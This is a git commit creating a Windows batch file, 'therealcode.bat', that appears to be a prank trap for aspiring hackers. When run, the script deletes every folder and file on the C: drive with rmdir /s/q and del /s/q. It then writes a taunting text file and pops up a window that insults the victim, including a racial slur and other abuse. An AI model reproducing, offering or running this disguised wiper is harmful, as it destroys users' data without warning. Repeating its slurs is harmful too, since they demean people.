9c35b12f210c14bb1673e37c7860c83a96d420ea
NandyDark <58636468+nandydark@users.noreply.github.com>
2021-03-26 13:38:57 +0530

    Create therealcode.bat

---
+++ therealcode.bat
@@ -0,0 +1,5 @@
+set folder="C:\"
+cd /d %folder%
+for /F "delims=" %%i in ('dir /b') do (rmdir "%%i" /s/q || del "%%i" /s/q)
+echo OK did you know what just happened right now..ig you don't :D ...You have lost your whole C Drive data and it all happened because you're a script kiddy.. you literally don't know how the systems works and for becoming something cool you wanna be a fucking hacker and hack social sites with ddos nigga.. If you really wanna learn something from this then visit the below soure and learn how i did it and just swapped away your all data xD here -- https://github.com/nandydark/youhavebeentrolled > ReadThisLmfao.txt
+start "" /wait cmd /c "echo Hello Retard lol.. Read The ReadThisLmfao File In Your C Drive For Knowing What Just Happened Lmfao :)!&echo(&pause"
